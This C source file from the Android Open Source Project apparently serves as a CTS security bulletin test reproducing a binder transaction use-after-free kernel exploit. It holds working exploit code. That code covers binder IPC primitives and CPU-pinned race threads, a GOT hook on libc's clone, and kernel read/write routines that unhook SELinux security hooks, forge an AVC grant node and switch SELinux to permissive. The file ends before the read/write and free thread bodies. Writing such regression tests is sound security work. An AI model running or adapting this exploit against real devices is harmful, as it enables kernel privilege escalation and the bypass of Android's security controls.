/*
 * Copyright (C) 2019 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#define _GNU_SOURCE
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/prctl.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <syscall.h>
#include <pthread.h>
#include <dirent.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <poll.h>
#include <elf.h>

#include <cutils/log.h>
#include <cutils/properties.h>
#include <jni.h>
#include <linux/android/binder.h>
#include <cpu-features.h>

#include "../../../../hostsidetests/securitybulletin/securityPatch/includes/common.h"

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;
typedef int64_t s64;

jobject this;
jmethodID add_log;
JavaVM *jvm;

#define MAX_THREADS 10

struct tid_jenv {
    int tid;
    JNIEnv *env;
};
struct tid_jenv tid_jenvs[MAX_THREADS];
int num_threads;

int gettid() {
    return (int)syscall(SYS_gettid);
}

void fail(char *msg, ...);

void add_jenv(JNIEnv *e) {
    if (num_threads >= MAX_THREADS) {
        fail("too many threads");
        return;
    }
    struct tid_jenv *te = &tid_jenvs[num_threads++];
    te->tid = gettid();
    te->env = e;
}

JNIEnv *get_jenv() {
    int tid = gettid();
    for (int i = 0; i < num_threads; i++) {
        struct tid_jenv *te = &tid_jenvs[i];
        if (te->tid == tid)
            return te->env;
    }
    return NULL;
}

void jni_attach_thread() {
    JNIEnv *env;
    (*jvm)->AttachCurrentThread(jvm, &env, NULL);
    add_jenv(env);
}

pthread_mutex_t log_mut = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t log_pending = PTHREAD_COND_INITIALIZER;
pthread_cond_t log_done = PTHREAD_COND_INITIALIZER;
volatile char *log_line;

void send_log_thread(char *msg) {
    pthread_mutex_lock(&log_mut);
    while (log_line)
        pthread_cond_wait(&log_done, &log_mut);
    log_line = msg;
    pthread_cond_signal(&log_pending);
    pthread_mutex_unlock(&log_mut);
}

void dbg(char *msg, ...);

void log_thread(u64 arg) {
    while (1) {
        pthread_mutex_lock(&log_mut);
        while (!log_line)
            pthread_cond_wait(&log_pending, &log_mut);
        dbg("%s", log_line);
        free((void*)log_line);
        log_line = NULL;
        pthread_cond_signal(&log_done);
        pthread_mutex_unlock(&log_mut);
    }
}

void dbg(char *msg, ...) {
    char *line;
    va_list va;
    JNIEnv *env = get_jenv();
    va_start(va, msg);
    if (vasprintf(&line, msg, va) >= 0) {
        if (env) {
            jstring jline = (*env)->NewStringUTF(env, line);
            (*env)->CallVoidMethod(env, this, add_log, jline);
            free(line);
        } else {
            send_log_thread(line);
        }
    }
    va_end(va);
}

void fail(char *msg, ...) {
    char *line;
    va_list va;
    va_start(va, msg);
    if (vasprintf(&line, msg, va) >= 0)
        dbg("FAIL: %s (errno=%d)", line, errno);
    va_end(va);
}

struct buffer {
    char *p;
    u32 size;
    u32 off;
};

typedef struct buffer buf_t;

struct parser {
    u8 *buf;
    u8 *p;
    u32 size;
};

typedef struct parser parser_t;

parser_t *new_parser() {
    parser_t *ret = malloc(sizeof(parser_t));
    ret->size = 0x400;
    ret->buf = ret->p = malloc(ret->size);
    return ret;
}

void free_parser(parser_t *parser) {
    free(parser->buf);
    free(parser);
}

int parser_end(parser_t *p) {
    return !p->size;
}

void *parser_get(parser_t *p, u32 sz) {
    if (sz > p->size) {
        fail("parser size exceeded");
        return NULL;
    }
    p->size -= sz;
    u8 *ret = p->p;
    p->p += sz;
    return ret;
}

u32 parse_u32(parser_t *p) {
    u32 *pu32 = parser_get(p, sizeof(u32));
    return (pu32 == NULL) ? (u32)-1 : *pu32;
}

buf_t *new_buf_sz(u32 sz) {
    buf_t *b = malloc(sizeof(buf_t));
    b->size = sz;
    b->off = 0;
    b->p = malloc(sz);
    return b;
}

buf_t *new_buf() {
    return new_buf_sz(0x200);
}

void free_buf(buf_t *buf) {
    free(buf->p);
    free(buf);
}

void *buf_alloc(buf_t *b, u32 s) {
    s = (s + 3) & ~3;
    if (b->size - b->off < s)
        fail("out of buf space");
    char *ret = b->p + b->off;
    b->off += s;
    memset(ret, 0x00, s);
    return ret;
}

void buf_u32(buf_t *b, u32 v) {
    char *p = buf_alloc(b, sizeof(u32));
    *(u32*)p = v;
}

void buf_u64(buf_t *b, u64 v) {
    char *p = buf_alloc(b, sizeof(u64));
    *(u64*)p = v;
}

void buf_uintptr(buf_t *b, u64 v) {
    char *p = buf_alloc(b, sizeof(u64));
    *(u64*)p = v;
}

void buf_str16(buf_t *b, const char *s) {
    if (!s) {
        buf_u32(b, 0xffffffff);
        return;
    }
    u32 len = strlen(s);
    buf_u32(b, len);
    u16 *dst = (u16*)buf_alloc(b, (len + 1) * 2);
    for (u32 i = 0; i < len; i++)
        dst[i] = s[i];
    dst[len] = 0;
}

void buf_binder(buf_t *b, buf_t *off, void *ptr) {
    buf_u64(off, b->off);
    struct flat_binder_object *fp = buf_alloc(b, sizeof(*fp));
    fp->hdr.type = BINDER_TYPE_BINDER;
    fp->flags = FLAT_BINDER_FLAG_ACCEPTS_FDS;
    fp->binder = (u64)ptr;
    fp->cookie = 0;
}

static inline void binder_write(int fd, buf_t *buf);

void enter_looper(int fd) {
    buf_t *buf = new_buf();
    buf_u32(buf, BC_ENTER_LOOPER);
    binder_write(fd, buf);
}

void init_binder(int fd) {
    void *map_ret = mmap(NULL, 0x200000, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map_ret == MAP_FAILED)
        fail("map fail");
    enter_looper(fd);
}

int open_binder() {
    int fd = open("/dev/binder", O_RDONLY);
    if (fd < 0)
        fail("open binder fail");
    init_binder(fd);
    return fd;
}

static inline void binder_rw(int fd, void *rbuf, u32 rsize,
        void *wbuf, u32 wsize, u32 *read_consumed, u32 *write_consumed) {
    struct binder_write_read bwr;
    memset(&bwr, 0x00, sizeof(bwr));
    bwr.read_buffer = (u64)rbuf;
    bwr.read_size = rsize;
    bwr.write_buffer = (u64)wbuf;
    bwr.write_size = wsize;
    if (ioctl(fd, BINDER_WRITE_READ, &bwr) < 0)
        fail("binder ioctl fail");
    if (read_consumed)
        *read_consumed = bwr.read_consumed;
    if (write_consumed)
        *write_consumed = bwr.write_consumed;
}

void binder_read(int fd, void *rbuf, u32 rsize, u32 *read_consumed) {
    binder_rw(fd, rbuf, rsize, 0, 0, read_consumed, NULL);
}

static inline void binder_write(int fd, buf_t *buf) {
    u32 write_consumed;
    binder_rw(fd, 0, 0, buf->p, buf->off, NULL, &write_consumed);
    if (write_consumed != buf->off)
        fail("binder write fail");
    free_buf(buf);
}

void do_send_txn(int fd, u32 to, u32 code, buf_t *trdat, buf_t *troff, int oneway, int is_reply, binder_size_t extra_sz) {
    buf_t *buf = new_buf();
    buf_u32(buf, is_reply ? BC_REPLY_SG : BC_TRANSACTION_SG);
    struct binder_transaction_data_sg *tr;
    tr = buf_alloc(buf, sizeof(*tr));
    struct binder_transaction_data *trd = &tr->transaction_data;
    trd->target.handle = to;
    trd->code = code;
    if (oneway)
        trd->flags |= TF_ONE_WAY;
    trd->data.ptr.buffer = trdat ? (u64)trdat->p : 0;
    trd->data.ptr.offsets = troff ? (u64)troff->p : 0;
    trd->data_size = trdat ? trdat->off : 0;
    trd->offsets_size = troff ? troff->off : 0;
    tr->buffers_size = extra_sz;
    binder_write(fd, buf);
    if (trdat)
        free_buf(trdat);
    if (troff)
        free_buf(troff);
}

void send_txn(int fd, u32 to, u32 code, buf_t *trdat, buf_t *troff) {
    do_send_txn(fd, to, code, trdat, troff, 0, 0, 0);
}

void send_reply(int fd) {
    do_send_txn(fd, 0, 0, NULL, NULL, 0, 1, 0);
}

static inline void chg_ref(int fd, unsigned desc, u32 cmd) {
    buf_t *buf = new_buf();
    buf_u32(buf, cmd);
    buf_u32(buf, desc);
    binder_write(fd, buf);
}

void inc_ref(int fd, unsigned desc) {
    chg_ref(fd, desc, BC_ACQUIRE);
}

void dec_ref(int fd, unsigned desc) {
    chg_ref(fd, desc, BC_RELEASE);
}

static inline void free_buffer(int fd, u64 ptr) {
    buf_t *buf = new_buf();
    buf_u32(buf, BC_FREE_BUFFER);
    buf_uintptr(buf, ptr);
    binder_write(fd, buf);
}

typedef struct {
    int fd;
    char *buf;
    binder_size_t size;
    binder_size_t parsed;
    binder_size_t *offsets;
    binder_size_t num_offsets;
    u32 code;
    u64 ptr;
} txn_t;

void *txn_get(txn_t *t, u32 sz) {
    sz = (sz + 3) & ~3u;
    if (sz > t->size - t->parsed)
        fail("txn get not enough data");
    char *ret = t->buf + t->parsed;
    t->parsed += sz;
    return ret;
}

binder_size_t txn_offset(txn_t *t) {
    return t->parsed;
}

void txn_set_offset(txn_t *t, binder_size_t off) {
    t->parsed = off;
}

u32 txn_u32(txn_t *t) {
    return *(u32*)txn_get(t, sizeof(u32));
}

int txn_int(txn_t *t) {
    return *(int*)txn_get(t, sizeof(int));
}

u32 txn_handle(txn_t *t) {
    struct flat_binder_object *fp;
    fp = txn_get(t, sizeof(*fp));
    if (fp->hdr.type != BINDER_TYPE_HANDLE)
        fail("expected binder");
    return fp->handle;
}

u16 *txn_str(txn_t *t) {
    int len = txn_int(t);
    if (len == -1)
        return NULL;
   if (len > 0x7fffffff / 2 - 1)
        fail("bad txn str len");
    return txn_get(t, (len + 1) * 2);
}

static inline u64 txn_buf(txn_t *t) {
    return (u64)t->buf;
}

void free_txn(txn_t *txn) {
    free_buffer(txn->fd, txn_buf(txn));
}


void handle_cmd(int fd, u32 cmd, void *dat) {
    if (cmd == BR_ACQUIRE || cmd == BR_INCREFS) {
        struct binder_ptr_cookie *pc = dat;
        buf_t *buf = new_buf();
        u32 reply = cmd == BR_ACQUIRE ? BC_ACQUIRE_DONE : BC_INCREFS_DONE;
        buf_u32(buf, reply);
        buf_uintptr(buf, pc->ptr);
        buf_uintptr(buf, pc->cookie);
        binder_write(fd, buf);
    }
}

void recv_txn(int fd, txn_t *t) {
    u32 found = 0;
    while (!found) {
        parser_t *p = new_parser();
        binder_read(fd, p->p, p->size, &p->size);
        while (!parser_end(p)) {
            u32 cmd = parse_u32(p);
            void *dat = (void *)parser_get(p, _IOC_SIZE(cmd));
            if (dat == NULL) {
                return;
            }
            handle_cmd(fd, cmd, dat);
            if (cmd == BR_TRANSACTION || cmd == BR_REPLY) {
                struct binder_transaction_data *tr = dat;
                if (!parser_end(p))
                    fail("expected parser end");
                t->fd = fd;
                t->buf = (char*)tr->data.ptr.buffer;
                t->parsed = 0;
                t->size = tr->data_size;
                t->offsets = (binder_size_t*)tr->data.ptr.offsets;
                t->num_offsets = tr->offsets_size / sizeof(binder_size_t);
                t->code = tr->code;
                t->ptr = tr->target.ptr;
                found = 1;
            }
        }
        free_parser(p);
    }
}

u32 recv_handle(int fd) {
    txn_t txn;
    recv_txn(fd, &txn);
    u32 hnd = txn_handle(&txn);
    inc_ref(fd, hnd);
    free_txn(&txn);
    return hnd;
}

u32 get_activity_svc(int fd) {
    buf_t *trdat = new_buf();
    buf_u32(trdat, 0); // policy
    buf_str16(trdat, "android.os.IServiceManager");
    buf_str16(trdat, "activity");
    int SVC_MGR_GET_SERVICE = 1;
    send_txn(fd, 0, SVC_MGR_GET_SERVICE, trdat, NULL);
    return recv_handle(fd);
}

void txn_part(txn_t *t) {
    int repr = txn_int(t);
    if (repr == 0) {
        txn_str(t);
        txn_str(t);
    } else if (repr == 1 || repr == 2) {
        txn_str(t);
    } else {
        fail("txn part bad repr");
    }
}

void txn_uri(txn_t *t) {
    int type = txn_int(t);
    if (type == 0) // NULL_TYPE_ID
        return;
    if (type == 1) { // StringUri.TYPE_ID
        txn_str(t);
    } else if (type == 2) {
        txn_str(t);
        txn_part(t);
        txn_part(t);
    } else if (type == 3) {
        txn_str(t);
        txn_part(t);
        txn_part(t);
        txn_part(t);
        txn_part(t);
    } else {
        fail("txn uri bad type");
    }
}

void txn_component(txn_t *t) {
    u16 *pkg = txn_str(t);
    if (pkg)
        txn_str(t); // class
}

void txn_rect(txn_t *t) {
    txn_int(t);
    txn_int(t);
    txn_int(t);
    txn_int(t);
}

int str16_eq(u16 *s16, char *s) {
    while (*s) {
        if (*s16++ != *s++)
            return 0;
    }
    return !*s16;
}

void txn_bundle(txn_t *t, u32 *hnd) {
    int len = txn_int(t);
    if (len < 0)
        fail("bad bundle len");
    if (len == 0)
        return;
    int magic = txn_int(t);
    if (magic != 0x4c444e42 && magic != 0x4c444e44)
        fail("bad bundle magic");
    binder_size_t off = txn_offset(t);
    int count = txn_int(t);
    if (count == 1) {
        u16 *key = txn_str(t);
        int type = txn_int(t);
        if (str16_eq(key, "bnd") && type == 15)
            *hnd = txn_handle(t);
    }
    txn_set_offset(t, off);
    txn_get(t, len);
}

void txn_intent(txn_t *t, u32 *hnd) {
    txn_str(t); // action
    txn_uri(t);
    txn_str(t); // type
    txn_int(t); // flags
    txn_str(t); // package
    txn_component(t);
    if (txn_int(t)) // source bounds
        txn_rect(t);
    int n = txn_int(t);
    if (n > 0) {
        for (int i = 0; i < n; i++)
            txn_str(t);
    }
    if (txn_int(t)) // selector
        txn_intent(t, NULL);
    if (txn_int(t))
        fail("unexpected clip data");
    txn_int(t); // content user hint
    txn_bundle(t, hnd); // extras
}

void get_task_info(int fd, u32 app_task, u32 *hnd) {
    buf_t *trdat = new_buf();
    buf_u32(trdat, 0); // policy
    buf_str16(trdat, "android.app.IAppTask");
    send_txn(fd, app_task, 1 + 1, trdat, NULL);
    txn_t txn;
    recv_txn(fd, &txn);
    if (txn_u32(&txn) != 0)
        fail("getTaskInfo exception");
    if (txn_int(&txn) == 0)
        fail("getTaskInfo returned null");
    txn_int(&txn); // id
    txn_int(&txn); // persistent id
    if (txn_int(&txn) > 0) // base intent
        txn_intent(&txn, hnd);
    if (*hnd != ~0u)
        inc_ref(fd, *hnd);
    free_txn(&txn);
}

u32 get_app_tasks(int fd, u32 actsvc) {
    buf_t *trdat = new_buf();
    buf_u32(trdat, 0); // policy
    buf_str16(trdat, "android.app.IActivityManager");
    buf_str16(trdat, "android.security.cts");
    send_txn(fd, actsvc, 1 + 199, trdat, NULL);
    txn_t txn;
    recv_txn(fd, &txn);
    if (txn_u32(&txn) != 0)
        fail("getAppTasks exception");
    int n = txn_int(&txn);
    if (n < 0)
        fail("getAppTasks n < 0");
    u32 hnd = ~0u;
    for (int i = 0; i < n; i++) {
        u32 app_task = txn_handle(&txn);
        get_task_info(fd, app_task, &hnd);
        if (hnd != ~0u)
            break;
    }
    if (hnd == ~0u)
        fail("didn't find intent extras binder");
    free_txn(&txn);
    return hnd;
}

u32 get_exchg(int fd) {
    u32 actsvc = get_activity_svc(fd);
    u32 ret = get_app_tasks(fd, actsvc);
    dec_ref(fd, actsvc);
    return ret;
}

int get_binder(u32 *exchg) {
    int fd = open_binder();
    *exchg = get_exchg(fd);
    return fd;
}

void exchg_put_binder(int fd, u32 exchg) {
    buf_t *trdat = new_buf();
    buf_t *troff = new_buf();
    buf_u32(trdat, 0); // policy
    buf_str16(trdat, "android.security.cts.IBinderExchange");
    buf_binder(trdat, troff, (void*)1);
    send_txn(fd, exchg, 1, trdat, troff);
    txn_t txn;
    recv_txn(fd, &txn);
    free_txn(&txn);
}

u32 exchg_get_binder(int fd, u32 exchg) {
    buf_t *trdat = new_buf();
    buf_u32(trdat, 0); // policy
    buf_str16(trdat, "android.security.cts.IBinderExchange");
    send_txn(fd, exchg, 2, trdat, NULL);
    txn_t txn;
    recv_txn(fd, &txn);
    if (txn_u32(&txn) != 0)
        fail("getBinder exception");
    u32 hnd = txn_handle(&txn);
    inc_ref(fd, hnd);
    free_txn(&txn);
    return hnd;
}

void set_idle() {
  struct sched_param param = {
    .sched_priority = 0
  };
  if (sched_setscheduler(0, SCHED_IDLE, &param) < 0)
    fail("sched_setscheduler fail");
}

int do_set_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    return sched_setaffinity(0, sizeof(set), &set);
}

void set_cpu(int cpu) {
    if (do_set_cpu(cpu) < 0)
        fail("sched_setaffinity fail");
}

struct sync {
    pthread_cond_t cond;
    pthread_mutex_t mutex;
    volatile int triggered;
    size_t num_waiters;
    volatile size_t num_waited;
    volatile size_t num_done;
};

typedef struct sync sync_t;

sync_t *alloc_sync() {
    sync_t *ret = malloc(sizeof(sync_t));
    if (pthread_mutex_init(&ret->mutex, NULL) ||
        pthread_cond_init(&ret->cond, NULL))
        fail("pthread init failed");
    ret->triggered = 0;
    ret->num_waiters = 1;
    ret->num_waited = 0;
    ret->num_done = 0;
    return ret;
}

void sync_set_num_waiters(sync_t *sync, size_t num_waiters) {
    sync->num_waiters = num_waiters;
}

void sync_pth_bc(sync_t *sync) {
    if (pthread_cond_broadcast(&sync->cond) != 0)
        fail("pthread_cond_broadcast failed");
}

void sync_pth_wait(sync_t *sync) {
    pthread_cond_wait(&sync->cond, &sync->mutex);
}

void sync_wait(sync_t *sync) {
    pthread_mutex_lock(&sync->mutex);
    sync->num_waited++;
    sync_pth_bc(sync);
    while (!sync->triggered)
        sync_pth_wait(sync);
    pthread_mutex_unlock(&sync->mutex);
}

void sync_signal(sync_t *sync) {
    pthread_mutex_lock(&sync->mutex);
    while (sync->num_waited != sync->num_waiters)
        sync_pth_wait(sync);
    sync->triggered = 1;
    sync_pth_bc(sync);
    pthread_mutex_unlock(&sync->mutex);
}

void sync_done(sync_t *sync) {
    pthread_mutex_lock(&sync->mutex);
    sync->num_done++;
    sync_pth_bc(sync);
    while (sync->triggered)
        sync_pth_wait(sync);
    pthread_mutex_unlock(&sync->mutex);
}

void sync_wait_done(sync_t *sync) {
    pthread_mutex_lock(&sync->mutex);
    while (sync->num_done != sync->num_waiters)
        sync_pth_wait(sync);
    sync->triggered = 0;
    sync->num_waited = 0;
    sync->num_done = 0;
    sync_pth_bc(sync);
    pthread_mutex_unlock(&sync->mutex);
}

static inline void ns_to_timespec(u64 t, struct timespec *ts) {
    const u64 k = 1000000000;
    ts->tv_sec = t / k;
    ts->tv_nsec = t % k;
}

static inline u64 timespec_to_ns(volatile struct timespec *t) {
     return (u64)t->tv_sec * 1000000000 + t->tv_nsec;
}

static inline u64 time_now() {
    struct timespec now;
    if (clock_gettime(CLOCK_MONOTONIC, &now) < 0)
        fail("clock_gettime failed");
    return timespec_to_ns(&now);
}

static inline void sleep_until(u64 t) {
    struct timespec wake;
    ns_to_timespec(t, &wake);
    int ret = clock_nanosleep(CLOCK_MONOTONIC, TIMER_ABSTIME, &wake, NULL);
    if (ret && ret != EINTR)
        fail("clock_nanosleep failed");
}

void set_thread_name(const char *name) {
    if (prctl(PR_SET_NAME, name) < 0)
        fail("pr_set_name fail");
}

void set_timerslack() {
    char path[64];
    sprintf(path, "/proc/%d/timerslack_ns", gettid());
    int fd = open(path, O_WRONLY);
    if (fd < 0)
        fail("open timerslack fail");
    if (write(fd, "1\n", 2) != 2)
        fail("write timeslack fail");
    close(fd);
}

struct launch_dat {
    u64 arg;
    void (*func)(u64);
    int attach_jni;
    const char *name;
};

void *thread_start(void *vdat) {
    struct launch_dat *dat = vdat;
    if (dat->attach_jni)
        jni_attach_thread();
    set_thread_name(dat->name);
    void (*func)(u64) = dat->func;
    u64 arg = dat->arg;
    free(dat);
    (*func)(arg);
    return NULL;
}

int launch_thread(const char *name, void (*func)(u64), sync_t **sync, u64 arg,
        int attach_jni) {
    if (sync)
        *sync = alloc_sync();
    struct launch_dat *dat = malloc(sizeof(*dat));
    dat->func = func;
    dat->arg = arg;
    dat->attach_jni = attach_jni;
    dat->name = name;
    pthread_t th;
    if (pthread_create(&th, NULL, thread_start, dat) != 0)
        fail("pthread_create failed");
    return pthread_gettid_np(th);
}

void *map_path(const char *path, u64 *size) {
    int fd = open(path, O_RDONLY);
    if (fd < 0)
        fail("open libc fail");
    struct stat st;
    if (fstat(fd, &st) < 0)
        fail("fstat fail");
    void *map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED)
        fail("mmap libc fail");
    *size = st.st_size;
    close(fd);
    return map;
}

typedef Elf64_Ehdr ehdr_t;
typedef Elf64_Shdr shdr_t;
typedef Elf64_Rela rela_t;
typedef Elf64_Sym sym_t;

shdr_t *find_rela_plt(void *elf) {
    ehdr_t *ehdr = (ehdr_t *)elf;
    shdr_t *shdr = ((shdr_t *)elf) + ehdr->e_shoff;
    char *shstr = ((char *)elf) + shdr[ehdr->e_shstrndx].sh_offset;
    for (u64 i = 0; i < ehdr->e_shnum; i++) {
        char *name = shstr + shdr[i].sh_name;
        if (strcmp(name, ".rela.plt") == 0)
            return &shdr[i];
    }
    fail("didn't find .rela.plt");
    return NULL;
}

u64 find_elf_clone_got(const char *path) {
    u64 mapsz;
    void *elf = map_path(path, &mapsz);
    ehdr_t *ehdr = (ehdr_t *)elf;
    shdr_t *shdr = ((shdr_t *)elf) + ehdr->e_shoff;
    shdr_t *rphdr = find_rela_plt(elf);
    if (rphdr == NULL) {
        return (u64)0;
    }
    shdr_t *symhdr = &shdr[rphdr->sh_link];
    shdr_t *strhdr = &shdr[symhdr->sh_link];
    sym_t *sym = ((sym_t *)elf) + symhdr->sh_offset;
    char *str = ((char *)elf) + strhdr->sh_offset;
    rela_t *r = ((rela_t *)elf) + rphdr->sh_offset;
    rela_t *end = r + rphdr->sh_size / sizeof(rela_t);
    u64 ret = 0;
    for (; r < end; r++) {
        sym_t *s = &sym[ELF64_R_SYM(r->r_info)];
        if (strcmp(str + s->st_name, "clone") == 0) {
            ret = r->r_offset;
            break;
        }
    }
    if (!ret) {
        fail("clone rela not found");
        return (u64)0;
    }
    if (munmap(elf, mapsz) < 0) {
        fail("munmap fail");
        return (u64)0;
    }
    return ret;
}

int hook_tid;
int (*real_clone)(u64 a, u64 b, int flags, u64 c, u64 d, u64 e, u64 f);

int clone_unshare_files(u64 a, u64 b, int flags, u64 c, u64 d, u64 e, u64 f) {
    if (gettid() == hook_tid)
        flags &= ~CLONE_FILES;
    return (*real_clone)(a, b, flags, c, d, e, f);
}

void unshare_following_clone_files() {
    hook_tid = gettid();
}

void hook_clone() {
    void *p = (void*)((uintptr_t)clone & ~0xffful);
    while (*(u32*)p != 0x464c457f)
        p = (void *)(((u32 *)p) - 0x1000);
    u64 *got = ((u64 *)p) + find_elf_clone_got("/system/lib64/libc.so");
    if (*got != (u64)clone)
        fail("bad got");
    real_clone = (void*)clone;
    void *page = (void*)((u64)got & ~0xffful);
    if (mprotect(page, 0x1000, PROT_READ | PROT_WRITE) < 0) {
        fail("got mprotect fail");
        return;
    }
    *got = (u64)clone_unshare_files;
}

u32 r32(u64 addr);
u64 r64(u64 addr);
void w64(u64 addr, u64 val);
void w128(u64 addr, u64 v1, u64 v2);
u64 scratch;
u64 rw_task;
u64 current;
u64 fdarr;

void hlist_del(u64 node) {
    u64 next = r64(node);
    u64 pprev = r64(node + 8);
    if (r64(pprev) != node) {
        fail("bad hlist");
        return;
    }
    w64(pprev, next);
    if (next)
        w64(next + 8, pprev);
}

u64 get_file(int fd) {
    return r64(fdarr + fd * 8);
}

u64 first_bl(u64 func) {
    for (int i = 0; i < 30; i++) {
        u32 inst = r32(func + i * 4);
        if ((inst >> 26) == 0x25) { // bl
            s64 off = inst & ((1u << 26) - 1);
            off <<= 64 - 26;
            off >>= 64 - 26;
            return func + i * 4 + off * 4;
        }
    }
    fail("bl not found");
    return (u64)-1;
}

int is_adrp(u32 inst) {
    return ((inst >> 24) & 0x9f) == 0x90;
}

u64 parse_adrp(u64 p, u32 inst) {
    s64 off = ((inst >> 5) & ((1u << 19) - 1)) << 2;
    off |= (inst >> 29) & 3;
    off <<= (64 - 21);
    off >>= (64 - 21 - 12);
    return (p & ~0xffful) + off;
}

u64 find_adrp_add(u64 addr) {
    time_t test_started = start_timer();
    while (timer_active(test_started)) {
        u32 inst = r32(addr);
        if (is_adrp(inst)) {
            u64 ret = parse_adrp(addr, inst);
            inst = r32(addr + 4);
            if ((inst >> 22) != 0x244) {
                fail("not add after adrp");
                return (u64)-1;
            }
            ret += (inst >> 10) & ((1u << 12) - 1);
            return ret;
        }
        addr += 4;
    }
    fail("adrp add not found");
    return (u64)-1;
}

u64 locate_hooks() {
    char path[256];
    DIR *d = opendir("/proc/self/map_files");
    char *p;
    while (1) {
        struct dirent *l = readdir(d);
        if (!l)
            fail("readdir fail");
        p = l->d_name;
        if (strcmp(p, ".") && strcmp(p, ".."))
            break;
    }
    sprintf(path, "/proc/self/map_files/%s", p);
    closedir(d);
    int fd = open(path, O_PATH | O_NOFOLLOW | O_RDONLY);
    if (fd < 0)
        fail("link open fail");
    struct stat st;
    if (fstat(fd, &st) < 0)
        fail("fstat fail");
    if (!S_ISLNK(st.st_mode))
        fail("link open fail");
    u64 file = get_file(fd);
    u64 inode = r64(file + 0x20);
    u64 iop = r64(inode + 0x20);
    u64 follow_link = r64(iop + 8);
    u64 cap = first_bl(follow_link);
    u64 scap = first_bl(cap);
    if (cap == (u64)-1 || scap == (u64)-1) {
        dbg("cap=%016zx", cap);
        dbg("scap=%016zx", scap);
        return (u64)-1;
    }
    u64 hooks = find_adrp_add(scap);
    close(fd);
    dbg("hooks=%016zx", hooks);
    return hooks;
}

void unhook(u64 hooks, int idx) {
    u64 hook = hooks + idx * 0x10;
    w128(hook, hook, hook);
}

u64 locate_avc(u64 hooks) {
    u64 se_file_open = r64(r64(hooks + 0x490) + 0x18);
    u64 seqno = first_bl(se_file_open);
    if (seqno == (u64)-1) {
        dbg("seqno=%016zx", seqno);
        return (u64)-1;
    }
    u64 avc = find_adrp_add(seqno);
    dbg("avc=%016zx", avc);
    return avc;
}

u32 get_sid() {
    u64 real_cred = r64(current + 0x788);
    u64 security = r64(real_cred + 0x78);
    u32 sid = r32(security + 4);
    dbg("sid=%u", sid);
    return sid;
}

struct avc_node {
    u32 ssid;
    u32 tsid;
    u16 tclass;
    u16 pad;
    u32 allowed;
};

u64 grant(u64 avc, u32 ssid, u32 tsid, u16 class) {
    struct avc_node n;
    n.ssid = ssid;
    n.tsid = tsid;
    n.tclass = class;
    n.pad = 0;
    n.allowed = ~0u;
    u64 node = scratch;
    for (int i = 0; i < 9; i++)
        w64(node + i * 8, 0);
    u64 *src = (u64*)&n;
    w64(node, src[0]);
    w64(node + 8, src[1]);
    int hash = (ssid ^ (tsid<<2) ^ (class<<4)) & 0x1ff;
    u64 head = avc + hash * 8;
    u64 hl = node + 0x28;
    u64 first = r64(head);
    w128(hl, first, head);
    if (first)
        w64(first + 8, hl);
    w64(head, hl);
    dbg("granted security sid");
    return hl;
}

int enforce() {
    int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd < 0)
        return 1;
    dbg("enforce=%d", fd);
    char buf;
    if (read(fd, &buf, 1) != 1)
        return 1;
    close(fd);
    return buf == '1';
}

void disable_enforce() {
    int fd = open("/sys/fs/selinux/enforce", O_WRONLY);
    if (fd >= 0) {
        write(fd, "0", 1);
        close(fd);
    }
    if (enforce())
        fail("failed to switch selinux to permissive");
    dbg("selinux now permissive");
}

void disable_selinux() {
    if (!enforce()) {
        dbg("selinux already permissive");
        return;
    }
    u64 hooks = locate_hooks();
    if (hooks == (u64)-1) {
        return;
    }
    u64 avc = locate_avc(hooks);
    if (avc == (u64)-1) {
        return;
    }
    unhook(hooks, 0x08); // capable
    unhook(hooks, 0x2f); // inode_permission
    unhook(hooks, 0x3d); // file_permission
    unhook(hooks, 0x49); // file_open
    u64 avcnode = grant(avc, get_sid(), 2, 1);
    disable_enforce();
    hlist_del(avcnode);
}

#define PIPES 8
#define STAGE2_THREADS 64

int cpumask;
int cpu1;
int cpu2;
int tot_cpus;
const char *pipedir;
char *pipepath;
char *pipeid;
int pipefd[PIPES];
sync_t *free_sync;
sync_t *poll_sync;
sync_t *stage2_sync1;
sync_t *stage2_sync2;
sync_t *rw_thread_sync;
int bnd1, bnd2;
u32 to1;
u64 free_ptr;
u64 trigger_time;
int total_txns;
int bad_pipe;
int uaf_pipe;
volatile int uaf_alloc_success;
u64 pipe_inode_info;
int rw_thread_tid;
volatile int rw_cmd;
volatile int rw_bit;
volatile int rw_val;
u64 free_data;
u64 next_free_data;

void select_cpus() {
    cpu1 = cpu2 = -1;
    for (int i = 7; i >= 0; i--) {
        if (do_set_cpu(i) < 0)
            continue;
        cpumask |= (1 << i);
        if (cpu1 < 0)
            cpu1 = i;
        else if (cpu2 < 0)
            cpu2 = i;
        tot_cpus++;
    }
    if (cpu1 < 0 || cpu2 < 0) {
        fail("huh, couldn't find 2 cpus");
    }
    dbg("cpumask=%02x cpu1=%d cpu2=%d", cpumask, cpu1, cpu2);
}

void rw_thread(u64 idx);
void free_thread(u64 arg);
void poll_thread(u64 arg);

int cpu_available(int cpu) {
    return !!(cpumask & (1 << cpu));
}

void hog_cpu_thread(u64 arg) {
    set_cpu(cpu2);
    time_t test_started = start_timer();
    while (timer_active(test_started)) {
    }
}

void launch_threads() {
    launch_thread("txnuaf.log", log_thread, NULL, 0, 1);
    launch_thread("txnuaf.hog", hog_cpu_thread, NULL, 0, 1);
    launch_thread("txnuaf.free", free_thread, &free_sync, 0, 1);
    launch_thread("txnuaf.poll", poll_thread, &poll_sync, 0, 1);
    rw_thread_tid = launch_thread("txnuaf.rw", rw_thread, &rw_thread_sync, 0, 0);
}

